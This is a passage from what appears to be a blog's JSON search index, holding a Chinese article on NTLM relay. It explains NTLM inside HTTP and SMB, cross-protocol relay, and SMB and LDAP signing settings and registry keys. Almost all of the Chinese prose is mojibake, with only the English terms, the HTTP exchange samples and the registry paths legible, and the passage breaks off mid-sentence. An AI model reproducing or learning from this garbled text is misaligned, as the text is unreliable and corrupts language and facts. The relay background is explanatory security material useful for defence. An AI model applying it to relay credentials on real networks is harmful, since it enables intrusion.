”å‘æ¥è¯´ï¼Œè¿™æ¡æ¶ˆæ¯æ˜¯ä»€ä¹ˆå¹¶ä¸é‡è¦ï¼Œé‡è¦çš„æ˜¯å°†å®ƒå‘é€åˆ°æœåŠ¡å™¨ã€‚ æœåŠ¡å™¨åœ¨æ”¶åˆ°æ¶ˆæ¯æ—¶è°ƒç”¨ AcceptSecurityContext å‡½æ•°ã€‚ è¿™ä¸ªå‡½æ•°ç„¶åå°†åˆ›å»ºç±»å‹ä¸º Challange çš„ type 2 æ•°æ®ã€‚ æ”¶åˆ°æ­¤æ¶ˆæ¯æ—¶ï¼Œå®¢æˆ·ç«¯å°†å†æ¬¡è°ƒç”¨ InitializeSecurityContextï¼Œä½†è¿™æ¬¡å°† CHALLENGE ä½œä¸ºå‚æ•°ä¼ é€’ã€‚ NTLMSSP è´Ÿè´£é€šè¿‡åŠ å¯† Challenge æ¥è®¡ç®—å“åº”çš„å†…å®¹ï¼Œå¹¶ç”Ÿæˆæœ€åçš„ AUTHENTICATE æ¶ˆæ¯ã€‚ æœåŠ¡å™¨æ”¶åˆ°è¯¥æ¶ˆæ¯åï¼Œä¹Ÿä¼šå†æ¬¡è°ƒç”¨ AcceptSecurityContextï¼Œè‡ªåŠ¨è¿›è¡Œé‰´æƒéªŒè¯ã€‚ è¿™æ„å‘³ç€è¿™ 5 ä¸ªæ­¥éª¤å®Œå…¨ç‹¬ç«‹äºå®¢æˆ·ç«¯çš„ç±»å‹æˆ–æœåŠ¡å™¨çš„ç±»å‹ã€‚ æ— è®ºä½¿ç”¨ä½•ç§åè®®ï¼Œåªè¦è¯¥åè®®å…·æœ‰å…è®¸è¿™ç§ä¸é€æ˜ç»“æ„ï¼Œä»¥ä¸€ç§æˆ–å¦ä¸€ç§æ–¹å¼ä»å®¢æˆ·ç«¯äº¤æ¢åˆ°æœåŠ¡å™¨çš„å†…å®¹ï¼Œå®ƒä»¬å°±å¯ä»¥å·¥ä½œã€‚ å› æ­¤ï¼Œåè®®é€šè¿‡å°† NTLMSSPã€Kerberos æˆ–å…¶ä»–èº«ä»½éªŒè¯ç»“æ„æ”¾å…¥ç‰¹å®šå­—æ®µï¼Œå¦‚æœå®¢æˆ·ç«¯æˆ–æœåŠ¡å™¨çœ‹åˆ°è¯¥å­—æ®µä¸­æœ‰æ•°æ®ï¼Œå®ƒåªä¼šå°†å…¶ä¼ é€’ç»™ InitializeSecurityContext æˆ– AcceptSecurityContextã€‚ åº”ç”¨å±‚ï¼ˆHTTPã€SMBã€SQL ç­‰ï¼‰å®Œå…¨ç‹¬ç«‹äºèº«ä»½éªŒè¯å±‚ï¼ˆNTLMã€Kerberos ç­‰ï¼‰ã€‚ å› æ­¤ï¼Œè®¤è¯å±‚å’Œåº”ç”¨å±‚éƒ½éœ€è¦å®‰å…¨æªæ–½ã€‚ é€šè¿‡ SMB å’Œ HTTP çš„ä¸¤ä¸ªç¤ºä¾‹å¸®åŠ©è¯»è€…æ›´å¥½åœ°ç†è§£ã€‚å…¶å®ƒåè®®ä¹Ÿååˆ†ç›¸ä¼¼ã€‚ ","date":"2021-09-24","objectID":"/2021/09/ntlm-relay/:4:1","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€","NTLM"],"title":"NTLM Relay","uri":"/2021/09/ntlm-relay/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"4.2 HTTP \u0026 NTLM ä¸€ä¸ª HTTP çš„åŸºæœ¬è¯·æ±‚ï¼š GET /index.html HTTP/1.1 Host: www.geekby.site User-Agent: Mozilla/5.0 Accept: text/html Accept-Language: zh-cn æ­¤ç¤ºä¾‹ä¸­çš„å¿…éœ€å…ƒç´ æ˜¯ HTTP åŠ¨è¯ (GET)ã€è¯·æ±‚é¡µé¢çš„è·¯å¾„ (/index.html)ã€åè®®ç‰ˆæœ¬ (HTTP/1.1) æˆ–ä¸»æœºæ ‡å¤´ (Host: beta.hackndo.com)ã€‚ ä½†æ˜¯å¯ä»¥è¿˜æ·»åŠ å…¶å®ƒçš„ HTTP å¤´ã€‚æœ€å¥½çš„æƒ…å†µæ˜¯ï¼ŒæœåŠ¡å™¨çŸ¥é“è¿™äº›æ ‡å¤´ä¼šå­˜åœ¨ï¼Œå¹¶ä¸”çŸ¥é“å¦‚ä½•å¤„ç†ã€‚æœ€åçš„æƒ…å†µæ˜¯ç›´æ¥å¿½ç•¥ã€‚ æ­£æ˜¯ HTTP çš„æ­¤é¡¹ç‰¹æ€§ï¼Œèƒ½å¤Ÿå°† NTLM çš„ç›¸å…³ä¿¡æ¯ä»å®¢æˆ·ç«¯ä¼ è¾“åˆ°æœåŠ¡å™¨ã€‚å³åœ¨å®¢æˆ·ç«¯æ·»åŠ  Authorization çš„ HTTP å¤´ï¼Œåœ¨æœåŠ¡ç«¯æ·»åŠ ä¸€ä¸ª WWW-Authenticate çš„å¤´ã€‚å¦‚æœå®¢æˆ·ç«¯å°è¯•è®¿é—®éœ€è¦èº«ä»½éªŒè¯çš„ç½‘ç«™ï¼ŒæœåŠ¡å™¨å°†é€šè¿‡æ·»åŠ  WWW-Authenticate æ ‡å¤´æ¥å“åº”ï¼Œå†…å®¹åŒ…å«å…¶æ”¯æŒçš„ä¸åŒèº«ä»½éªŒè¯æœºåˆ¶ã€‚å¦‚å¯¹äº NTLMï¼Œè¿”å›ï¼šWWW-Authenticate: NTLMã€‚ å®¢æˆ·ç«¯çŸ¥é“éœ€è¦ NTLM èº«ä»½éªŒè¯ï¼Œå°†å‘é€ Authorization å¤´ä¸­çš„ç¬¬ä¸€æ¡æ¶ˆæ¯ï¼Œå¹¶ base64 ç¼–ç (å› ä¸ºè¯¥æ¶ˆæ¯ä»…åŒ…å«ä¸å¯æ‰“å°çš„å­—ç¬¦)ã€‚ æœåŠ¡å™¨å°†åœ¨ WWW-Authenticate å¡«å…… Challengeï¼Œå®¢æˆ·ç«¯å°†è®¡ç®—å“åº”å¹¶å°†å…¶æ”¾åˆ° Authorization å¤´ä¸­ã€‚å¦‚æœè®¤è¯æˆåŠŸï¼ŒæœåŠ¡å™¨é€šå¸¸ä¼šè¿”å› 200 è¿”å›ç ã€‚ \u003e GET /index.html HTTP/1.1 \u003e Host: www.geekby.site \u003e User-Agent: Mozilla/5.0 \u003e Accept: text/html \u003e Accept-Language: en \u003c HTTP/1.1 401 Unauthorized \u003c WWW-Authenticate: NTLM \u003c Content type: text/html \u003c Content-Length: 0 \u003e GET /index.html HTTP/1.1 \u003e Host: www.geekby.site \u003e User-Agent: Mozilla/5.0 \u003e Accept: text/html \u003e Accept-Language: zh-ch =\u003e Authorization: NTLM \u003cNEGOTIATE in base64\u003e \u003c HTTP/1.1 401 Unauthorized =\u003e WWW-Authenticate: NTLM \u003cCHALLENGE in base64\u003e \u003c Content type: text/html \u003c Content-Length: 0 \u003e GET /index.html HTTP/1.1 \u003e Host: www.geekby.site \u003e User-Agent: Mozilla/5.0 \u003e Accept: text/html \u003e Accept-Language: zh-cn =\u003e Authorization: NTLM \u003cRESPONSE in base64\u003e \u003c HTTP/1,200 OKAY. \u003c WWW-Authenticate: NTLM \u003c Content type: text/html \u003c Content-Length: 0 \u003c Connection: close åªè¦ TCP ä¼šè¯å¤„äºæ‰“å¼€çŠ¶æ€ï¼Œèº«ä»½éªŒè¯å°±ä¼šæœ‰æ•ˆã€‚ç„¶è€Œï¼Œä¸€æ—¦ä¼šè¯å…³é—­ï¼ŒæœåŠ¡å™¨å°†ä¸å†æ‹¥æœ‰å®¢æˆ·ç«¯çš„å®‰å…¨ä¸Šä¸‹æ–‡ï¼Œå¹¶ä¸”å¿…é¡»è¿›è¡Œæ–°çš„èº«ä»½éªŒè¯ã€‚ç”±äº Microsoft çš„ SSOï¼ˆå•ç‚¹ç™»å½•ï¼‰æœºåˆ¶ï¼Œæ•´ä¸ªè¿‡ç¨‹å¯¹ç”¨æˆ·æ˜¯é€æ˜çš„ã€‚ ","date":"2021-09-24","objectID":"/2021/09/ntlm-relay/:4:2","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€","NTLM"],"title":"NTLM Relay","uri":"/2021/09/ntlm-relay/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"4.3 SMB \u0026 NTLM å†ä¸¾ä¸€ä¸ªSMB åè®®çš„ä¾‹å­ã€‚SMB åè®®ï¼Œé€šå¸¸ç”¨äºè®¿é—®ç½‘ç»œå…±äº«ã€‚ SMB åè®®é€šè¿‡ä½¿ç”¨å‘½ä»¤æ¥å·¥ä½œ(Microsoft å®šä¹‰çš„ç›¸å…³æ–‡æ¡£)ï¼Œä¾‹å¦‚ï¼Œæœ‰ SMB_COM_OPENã€SMB_COM_CLOSE æˆ– SMB_COM_READï¼Œç”¨äºæ‰“å¼€ã€å…³é—­æˆ–è¯»å–æ–‡ä»¶çš„å‘½ä»¤ã€‚ SMB è¿˜æœ‰ä¸€ä¸ªä¸“é—¨ç”¨äºé…ç½® SMB ä¼šè¯çš„å‘½ä»¤ï¼ŒSMB_COM_SESSION_SETUP_ANDXã€‚ æ­¤å‘½ä»¤ä¸­æœ‰ä¸¤ä¸ªå­—æ®µä¸“ç”¨äº NTLM è®¤è¯çš„å­—æ®µã€‚ LM/LMv2 è®¤è¯ï¼šOEMPassword NTLM/NTLMv2 è®¤è¯ï¼šUnicodePassword ä¸‹å›¾æ˜¯ä¸€ä¸ª SMB æ•°æ®åŒ…çš„æ ·ä¾‹ï¼Œå…¶ä¸­åŒ…å«æœåŠ¡å™¨å¯¹èº«ä»½éªŒè¯çš„å“åº”ã€‚ è¿™ä¸¤ä¸ªç¤ºä¾‹è¡¨æ˜ NTLM çš„å†…å®¹ä¸åè®®æ— å…³ã€‚å®ƒå¯ä»¥åŒ…å«åœ¨ä»»ä½•æ”¯æŒå®ƒçš„åè®®ä¸­ã€‚ ç„¶åï¼Œå°†èº«ä»½éªŒè¯éƒ¨åˆ†ä¸åº”ç”¨ç¨‹åºä¼šè¯éƒ¨åˆ†åšåŒºåˆ†ã€‚ä¼šè¯éƒ¨åˆ†æ˜¯é€šè¿‡å®¢æˆ·ç«¯èº«ä»½éªŒè¯åä½¿ç”¨çš„åè®®è¿›è¡Œçš„äº¤æ¢çš„å»¶ç»­ï¼Œä¾‹å¦‚é€šè¿‡ HTTP æµè§ˆç½‘ç«™ï¼Œä½¿ç”¨ SMB è®¿é—®ç½‘ç»œå…±äº«ä¸Šçš„æ–‡ä»¶ã€‚ ç”±äºè®¤è¯å’Œä¼šè¯è¿‡ç¨‹å½¼æ­¤çš„ä¿¡æ¯æ˜¯ç‹¬ç«‹çš„ï¼Œè¿™æ„å‘³ç€ä¸­é—´äººå¾ˆå¯èƒ½ä¼šé€šè¿‡ HTTP æ¥æ”¶èº«ä»½éªŒè¯ï¼Œå¹¶å°†å…¶ä¸­ç»§åˆ°æœåŠ¡å™¨ä½†ä½¿ç”¨ SMBï¼Œç§°ä¸ºè·¨åè®®ä¸­ç»§ã€‚ è€ƒè™‘åˆ°æ‰€æœ‰è¿™äº›å› ç´ ï¼Œä¸‹ä¸€ç« èŠ‚å°†é‡ç‚¹ä»‹ç»å·²ç»å„ç§å­˜åœ¨é£é™©çš„ç‚¹ï¼Œä»¥åŠç”¨äºè§£å†³è¿™äº›é—®é¢˜æ‰€å¼•å…¥çš„å®‰å…¨æœºåˆ¶ã€‚ ","date":"2021-09-24","objectID":"/2021/09/ntlm-relay/:4:3","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€","NTLM"],"title":"NTLM Relay","uri":"/2021/09/ntlm-relay/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"5 ä¼šè¯ç­¾å ","date":"2021-09-24","objectID":"/2021/09/ntlm-relay/:5:0","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€","NTLM"],"title":"NTLM Relay","uri":"/2021/09/ntlm-relay/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"5.1 åŸç† ç­¾åæ˜¯ä¸€ç§éªŒè¯çœŸå®æ€§çš„æ–¹æ³•ï¼Œå®ƒç¡®ä¿æ•°æ®åœ¨å‘é€å’Œæ¥æ”¶ä¹‹é—´æ²¡æœ‰è¢«ç¯¡æ”¹ã€‚ä¾‹å¦‚ï¼Œå¦‚æœç”¨æˆ· jdoe å‘é€æ–‡æœ¬ Hello Worldï¼Œå¹¶å¯¹è¯¥æ–‡æ¡£è¿›è¡Œæ•°å­—ç­¾åï¼Œé‚£ä¹ˆä»»ä½•æ”¶åˆ°æ­¤æ–‡æ¡£å¹¶ç­¾åçš„äººéƒ½å¯ä»¥éªŒè¯æ˜¯ jdoe ç¼–è¾‘å®ƒï¼Œå¹¶ä¸”å¯ä»¥ç¡®å®šè¿™å¥è¯æ˜¯ä»–å†™çš„ï¼Œå› ä¸ºç­¾åä¿è¯æ–‡æ¡£æ²¡æœ‰è¢«ä¿®æ”¹ã€‚ ç­¾ååŸç†å¯ä»¥åº”ç”¨äºä¿¡æ¯äº¤æ¢ã€‚ä¾‹å¦‚ï¼ŒSMBã€LDAP ç”šè‡³ HTTP åè®®ã€‚ä½†æ˜¯ï¼Œåœ¨å®è·µä¸­ï¼Œå¾ˆå°‘å®ç° HTTP æ¶ˆæ¯çš„ç­¾åã€‚ ä½†æ˜¯ï¼Œå¯¹åŒ…ç­¾åæœ‰ä»€ä¹ˆæ„ä¹‰å‘¢ï¼Ÿå¦‚å‰æ‰€è¿°ï¼Œä¼šè¯å’Œèº«ä»½éªŒè¯æ˜¯ä¸¤ä¸ªç‹¬ç«‹çš„æ­¥éª¤ï¼Œç”±äºæ”»å‡»è€…å¯ä»¥å¤„äºä¸­é—´äººä½ç½®å¹¶ä¸­ç»§èº«ä»½éªŒè¯æ¶ˆæ¯ï¼Œå› æ­¤å®ƒå¯ä»¥å†’å……å®¢æˆ·ç«¯ã€‚ è¿™å°±æ˜¯ç­¾åå‘æŒ¥ä½œç”¨çš„åœ°æ–¹ã€‚å³ä½¿æ”»å‡»è€…å·²è®¾æ³•ä»¥å®¢æˆ·ç«¯èº«ä»½å‘æœåŠ¡å™¨è¿›è¡Œèº«ä»½éªŒè¯ï¼Œä½†æ— è®ºèº«ä»½éªŒè¯çš„ç»“æœå¦‚ä½•ï¼Œç”±äºæ²¡æœ‰ç”¨æˆ·çš„å¯†é’¥ï¼Œéƒ½æ— æ³•å¯¹æ•°æ®åŒ…è¿›è¡Œç­¾åã€‚å› æ­¤æ¥æ”¶æ•°æ®åŒ…çš„æœåŠ¡å™¨å°†çœ‹åˆ°ç­¾åå¤±æ•ˆåœ¨æˆ–ä¸å­˜åœ¨ï¼Œä¼šæ‹’ç»æ”»å‡»è€…çš„è¯·æ±‚ã€‚ æ‰€ä»¥ç­¾åå€¼é˜²æ­¢ NTLM ä¸­ç»§æ”»å‡»éå¸¸æœ‰æ•ˆçš„æªæ–½ã€‚ä½†æ˜¯å®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨å¦‚ä½•å°±æ˜¯å¦ç­¾ç½²æ•°æ®åŒ…è¾¾æˆä¸€è‡´å‘¢ï¼Ÿ æœ‰ä¸¤ä»¶äº‹åœ¨è¿™é‡Œèµ·ä½œç”¨ï¼š ä¸€æ˜¯æ ‡è¯†æ˜¯å¦æ”¯æŒç­¾åã€‚è¿™æ˜¯åœ¨ NTLM åå•†æœŸé—´å®Œæˆçš„ã€‚ äºŒæ˜¯å…è®¸æŒ‡ç¤ºç­¾åæ˜¯å¿…éœ€çš„ã€å¯é€‰çš„è¿˜æ˜¯ç¦ç”¨çš„ã€‚è¿™æ˜¯åœ¨å®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨çº§åˆ«å®Œæˆçš„è®¾ç½®ã€‚ ","date":"2021-09-24","objectID":"/2021/09/ntlm-relay/:5:1","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€","NTLM"],"title":"NTLM Relay","uri":"/2021/09/ntlm-relay/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"5.2 NTLM åå•†è¿‡ç¨‹ NTLM Negotiation é˜¶æ®µä½¿å¾—å®¢æˆ·ç«¯æˆ–æœåŠ¡å™¨äº†è§£æ˜¯å¦æ”¯æŒç­¾åï¼Œå¹¶åœ¨ NTLM äº¤æ¢æœŸé—´å®Œæˆã€‚äº‹å®ä¸Šï¼Œåœ¨ NTLM æ¶ˆæ¯ä¸­ï¼Œé™¤äº†è¦äº¤æ¢çš„è´¨è¯¢å’Œå“åº”ä¹‹å¤–ï¼Œè¿˜æœ‰ Negotiate Flagsã€‚ å½“ Negotiate Sign flag ä¸º 1 æ—¶ï¼Œè¡¨æ˜å®¢æˆ·ç«¯æ”¯æŒç­¾åã€‚ä½†æ˜¯å¹¶ä¸æ„å‘³ç€ç­¾åæ˜¯å¿…è¦çš„ï¼Œåªæ˜¯è¯´æ˜å®¢æˆ·ç«¯æœ‰ç­¾åçš„èƒ½åŠ›ã€‚åŒç†ï¼ŒæœåŠ¡ç«¯ä¹Ÿæ˜¯ç±»ä¼¼çš„ã€‚ å› æ­¤ï¼Œåå•†è¿‡ç¨‹å…è®¸å®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨ä¸¤æ–¹ä¸­çš„æ¯ä¸€æ–¹å‘å¦ä¸€æ–¹è¡¨æ˜å®ƒæ˜¯å¦èƒ½å¤Ÿå¯¹æ•°æ®åŒ…è¿›è¡Œç­¾åã€‚å¯¹äºæŸäº›åè®®ï¼Œå³ä½¿å®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨éƒ½æ”¯æŒç­¾åï¼Œè¿™å¹¶ä¸ä¸€å®šæ„å‘³ç€æ•°æ®åŒ…ä¼šè¢«ç­¾åã€‚ ","date":"2021-09-24","objectID":"/2021/09/ntlm-relay/:5:2","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€","NTLM"],"title":"NTLM Relay","uri":"/2021/09/ntlm-relay/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"5.3 å®ç° æ ¹æ®åè®®çš„ä¸åŒï¼Œé€šå¸¸å¯ä»¥è®¾ç½® 2 ä¸ªç”šè‡³ 3 ä¸ªé€‰é¡¹æ¥å†³å®šæ˜¯å¦å¼ºåˆ¶æ‰§è¡Œç­¾åã€‚ 3 ä¸ªé€‰é¡¹æ˜¯ï¼š Disabledï¼šç¦ç”¨ç­¾å Enabledï¼šå¯ä»¥åœ¨éœ€è¦æ—¶å¤„ç†ç­¾åï¼Œä½†ä¸å¼ºåˆ¶ç­¾åã€‚ Mandatoryï¼šè¡¨æ˜ä¸ä»…æ”¯æŒç­¾åï¼Œè€Œä¸”å¿…é¡»å¯¹æ•°æ®åŒ…è¿›è¡Œç­¾åæ‰èƒ½ç»§ç»­ä¼šè¯ã€‚ ä¸‹æ–‡å°†ä»¥ SMB å’Œ LDAP ä¸¤ä¸ªåè®®ä¸ºä¾‹ã€‚ 5.3.1 SMB 5.3.1.1 ç­¾åçŸ©é˜µ å¾®è½¯çš„ç›¸å…³æ–‡æ¡£ä¸­æä¾›äº†ä¸€ä¸ªçŸ©é˜µï¼Œä»¥ç¡®å®šæ˜¯å¦åŸºäºå®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨ç«¯è®¾ç½®å¯¹ SMB æ•°æ®åŒ…è¿›è¡Œç­¾åã€‚ä½†æ˜¯ï¼Œå¯¹äº SMBv2 åŠæ›´é«˜ç‰ˆæœ¬ï¼Œå¿…é¡»å¤„ç†ç­¾åï¼ŒDisabled å‚æ•°ä¸å†å­˜åœ¨ã€‚ å½“å®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨å…·æœ‰ Enabled è®¾ç½®æ—¶ä¼šæœ‰æ‰€ä¸åŒã€‚ åœ¨ SMBv1 ä¸­ï¼ŒæœåŠ¡å™¨çš„é»˜è®¤è®¾ç½®ä¸º Disabledã€‚é˜²æ­¢æœåŠ¡å™¨åœ¨æ¯æ¬¡å‘é€ SMB æ•°æ®åŒ…æ—¶è®¡ç®—ç­¾åæ¥é¿å…æœåŠ¡å™¨è¿‡è½½ï¼Œå› æ­¤ï¼Œå®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨ä¹‹é—´çš„æ‰€æœ‰ SMB æµé‡éƒ½æœªç­¾åã€‚ç”±äº SMBv2 ä¸å†å­˜åœ¨ç¦ç”¨çŠ¶æ€ï¼Œå¹¶ä¸”æœåŠ¡å™¨ç°åœ¨é»˜è®¤å¯ç”¨ï¼Œä¸ºäº†ä¿æŒè¿™ç§è´Ÿè½½èŠ‚çœï¼Œåœ¨è¿™ç§æƒ…å†µä¸‹ä¹Ÿæ˜¯ä¸éœ€è¦ç­¾åã€‚åªæœ‰å®¢æˆ·ç«¯æˆ–æœåŠ¡å™¨å¯ç”¨ Require å‚æ•°æ‰å¯¹ SMB æ•°æ®åŒ…è¿›è¡Œç­¾åã€‚ 5.3.1.2 è®¾ç½® ä¸ºäº†æ›´æ”¹æœåŠ¡å™¨ä¸Šçš„é»˜è®¤ç­¾åè®¾ç½®ï¼Œå¿…é¡»åœ¨æ³¨å†Œè¡¨é¡¹HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Services\\LanmanServer\\Parameters ä¸­æ›´æ”¹ EnableSecuritySignature å’Œ RequireSecuritySignature é¡¹ã€‚ åœ¨åŸŸæ§åˆ¶å™¨ä¸Šï¼Œ é»˜è®¤æƒ…å†µä¸‹ï¼Œå½“å®¢æˆ·ç«¯å¯¹å…¶è¿›è¡Œèº«ä»½éªŒè¯æ—¶ï¼ŒåŸŸæ§åˆ¶å™¨éœ€è¦ SMB ç­¾åã€‚ ä¸‹å›¾ä¸ºåº”ç”¨äºåŸŸæ§åˆ¶å™¨çš„ç»„ç­–ç•¥é…ç½®ï¼š å¦å¤–ï¼Œåœ¨ä¸Šå›¾ä¸­å¯ä»¥çœ‹åˆ°ï¼ŒMicrosoft network client é€‰é¡¹æœªè®¾ç½® Enable å‚æ•°ã€‚å› æ­¤ï¼Œå½“åŸŸæ§åˆ¶å™¨å……å½“ SMB æœåŠ¡å™¨æ—¶ï¼Œéœ€è¦ SMB ç­¾åï¼Œä½†å¦‚æœè¿æ¥æ¥è‡ªåŸŸæ§åˆ¶å™¨åˆ°å…¶å®ƒæœåŠ¡å™¨ï¼Œåˆ™ä¸éœ€è¦ SMB ç­¾åã€‚ 5.3.1.3 æµç¨‹ åœ¨äº†è§£ SMB ç­¾åçš„é…ç½®ä½ç½®ä¹‹åï¼Œå¯ä»¥çœ‹åˆ°åœ¨ NTLM åè®®é€šä¿¡æœŸé—´åº”ç”¨çš„è¿™ä¸ªé€‰é¡¹ï¼Œå®ƒæ˜¯åœ¨èº«ä»½éªŒè¯ä¹‹å‰å®Œæˆçš„ã€‚å½“å®¢æˆ·ç«¯è¿æ¥åˆ° SMB æœåŠ¡å™¨æ—¶ï¼Œæ­¥éª¤å¦‚ä¸‹ï¼š åå•† SMB ç‰ˆæœ¬å’Œç­¾åè¦æ±‚ éªŒè¯ å…·æœ‰åå•†å‚æ•°çš„ SMB ä¼šè¯ ä¸Šå›¾ä¸­å¯ä»¥çœ‹åˆ°ï¼Œæ¥è‡ªæœåŠ¡å™¨çš„å“åº”è¡¨æ˜å®ƒå…·æœ‰ Enable å‚æ•°ï¼Œä½†ä¸éœ€è¦ç­¾åã€‚ æ€»è€Œè¨€ä¹‹ï¼Œåå•† / èº«ä»½éªŒè¯ / ä¼šè¯çš„æµç¨‹å¦‚ä¸‹ï¼š åœ¨åå•†é˜¶æ®µï¼ŒåŒæ–¹æå‡ºè¦æ±‚ï¼šå…¶ä¸­ä¹‹ä¸€æ˜¯å¦éœ€è¦ç­¾åï¼Ÿ åœ¨è®¤è¯é˜¶æ®µï¼ŒåŒæ–¹è¡¨æ˜ä»–ä»¬æ”¯æŒä»€ä¹ˆã€‚å®ƒä»¬æœ‰èƒ½åŠ›ç­¾åä¹ˆï¼Ÿ åœ¨ä¼šè¯é˜¶æ®µï¼Œå¦‚æœèƒ½åŠ›å’Œè¦æ±‚å…¼å®¹ï¼Œåˆ™æŒ‰ç…§åå•†çš„å†…å®¹è¿›è¡Œä¼šè¯ã€‚ ä¾‹å¦‚ï¼Œå¦‚æœ DESKTOP01 å®¢æˆ·ç«¯è¦ä¸ DC01 åŸŸæ§åˆ¶å™¨é€šä¿¡ï¼Œåˆ™ DESKTOP01 è¡¨ç¤ºå®ƒä¸éœ€è¦ç­¾åï¼Œä½†æ˜¯å¯ä»¥å¤„ç†å¸¦ç­¾åçš„æ•°æ®åŒ…ã€‚ DC01 è¡¨ç¤ºä¸ä»…æ”¯æŒç­¾åï¼Œè€Œä¸”éœ€è¦ç­¾åï¼š åœ¨åå•†é˜¶æ®µï¼Œå®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨å°† NEGOTIATE_SIGN æ ‡å¿—è®¾ç½®ä¸º 1ï¼Œè¡¨ç¤ºå®ƒä»¬éƒ½æ”¯æŒç­¾åã€‚ èº«ä»½éªŒè¯å®Œæˆåï¼Œä¼šè¯å°†ç»§ç»­ï¼ŒSMB æ•°æ®åŒ…å°†è¢«ç­¾åã€‚ 5.3.2 LDAP 5.3.2.1 ç­¾åçŸ©é˜µ å¯¹äº LDAP åè®®æ¥è¯´ï¼Œæœ‰ä¸‰ä¸ªç­‰çº§ï¼š Disabledï¼šä¸æ”¯æŒæ•°æ®åŒ…ç­¾åã€‚ Negotiatedï¼šè¡¨ç¤ºå¯ä»¥å¤„ç†ç­¾åï¼Œå¦‚æœä¸ä¹‹é€šä¿¡çš„æœºå™¨ä¹Ÿå¯ä»¥å¤„ç†ç­¾åçš„è¯ï¼Œé‚£ä¹ˆåç»­çš„æ•°æ®å°†è¢«ç­¾åã€‚ Requiredï¼šè¡¨ç¤ºä¸ä»…æ”¯æŒç­¾åï¼Œè€Œä¸”å¿…é¡»å¯¹æ•°æ®åŒ…è¿›è¡Œç­¾åæ‰èƒ½ç»§ç»­ä¼šè¯ã€‚ åœ¨ä¸­é—´å±‚ï¼ŒNegotiated Signing ä¸ SMBv2 çš„æƒ…å†µä¸åŒã€‚å¦‚æœå®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨èƒ½å¤Ÿå¯¹æ•°æ®åŒ…è¿›è¡Œç­¾åï¼Œé‚£ä¹ˆå®ƒä»¬å°±ä¼šç­¾åã€‚ è€Œå¯¹äº SMBv2ï¼Œåªæœ‰åœ¨è‡³å°‘ä¸€ä¸ªå®ä½“å¼€å¯ Require æ—¶æ‰å¯¹æ•°æ®åŒ…è¿›è¡Œç­¾åã€‚ æ‰€ä»¥å¯¹äº LDAPï¼Œæœ‰ä¸€ä¸ªç±»ä¼¼äº SMBv1 çš„çŸ©é˜µï¼š å¦å¤–ï¼Œä¸ SMB ä¸åŒçš„æ˜¯ï¼Œåœ¨ Active Directory åŸŸä¸­ï¼Œæ‰€æœ‰ä¸»æœºéƒ½èƒ½è‡ªè¡Œé…ç½® Negotiated Signingã€‚åŸŸæ§åˆ¶å™¨ä¸å¼ºåˆ¶ç­¾åã€‚ 5.3.2.2 è®¾ç½® å¯¹äºåŸŸæ§åˆ¶å™¨ï¼Œldapserverintegrity æ³¨å†Œè¡¨é¡¹ä½äº HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Services\\NTDS\\Parameters hive ä¸­ï¼Œå¹¶ä¸”å¯ä»¥æ˜¯ 0ã€1 æˆ– 2ï¼Œå…·ä½“å–å†³äºçº§åˆ«ã€‚é»˜è®¤æƒ…å†µä¸‹ï¼Œå®ƒåœ¨åŸŸæ§åˆ¶å™¨ä¸Šè®¾ç½®ä¸º 1ã€‚ å¯¹äºå®¢æˆ·ç«¯ï¼Œæ­¤æ³¨å†Œè¡¨é¡¹ä½äº HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Services\\ldap å¯¹äºå®¢æˆ·ç«¯ï¼Œå®ƒä¹Ÿè®¾ç½®ä¸º 1ã€‚ç”±äºæ‰€æœ‰å®¢æˆ·ç«¯å’ŒåŸŸæ§åˆ¶å™¨éƒ½é»˜è®¤é…ç½®äº† Negotiatedï¼Œå› æ­¤é»˜è®¤æƒ…å†µä¸‹æ‰€æœ‰ LDAP æ•°æ®åŒ…éƒ½è¿›è¡Œç­¾åã€‚ 5.3.2.3 æµç¨‹ ä¸ SMB ä¸åŒï¼ŒLDAP ä¸­æ²¡æœ‰æŒ‡ç¤ºæ˜¯å¦å¯¹æ•°æ®åŒ…è¿›è¡Œç­¾åçš„æ ‡å¿—ã€‚ä½†æ˜¯ï¼ŒLDAP ä½¿ç”¨ä¸ NTLM åå•†ä¸­ç›¸åŒçš„ flag æ ‡å¿—ä½ã€‚åœ¨å®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨éƒ½æ”¯æŒ LDAP ç­¾åçš„æƒ…å†µä¸‹ï¼Œå°†è®¾ç½® NEGOTIATE_SIGN æ ‡å¿—å¹¶å¯¹æ•°æ®åŒ…è¿›è¡Œç­¾åã€‚ å¦‚æœä¸€æ–¹è¦æ±‚ç­¾åï¼Œè€Œå¦ä¸€æ–¹ä¸æ”¯æŒï¼Œåˆ™ä¼šè¯æ ¹æœ¬ä¸ä¼šå¼€å§‹ã€‚éœ€è¦ç­¾åçš„ä¸€æ–¹å°†å¿½ç•¥æœªç­¾åçš„æ•°æ®åŒ…ã€‚ æ‰€ä»¥ä¸ SMB ç›¸åï¼Œå¦‚æœæ”»å‡»è€…åœ¨å®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨ä¹‹é—´ï¼Œå¹¶ä¸”æƒ³ä½¿ç”¨ LDAP å°†èº«ä»½éªŒè¯ä¸­ç»§åˆ°æœåŠ¡å™¨ï¼Œéœ€è¦æ»¡è¶³ä¸¤ä¸ªæ¡ä»¶ï¼š 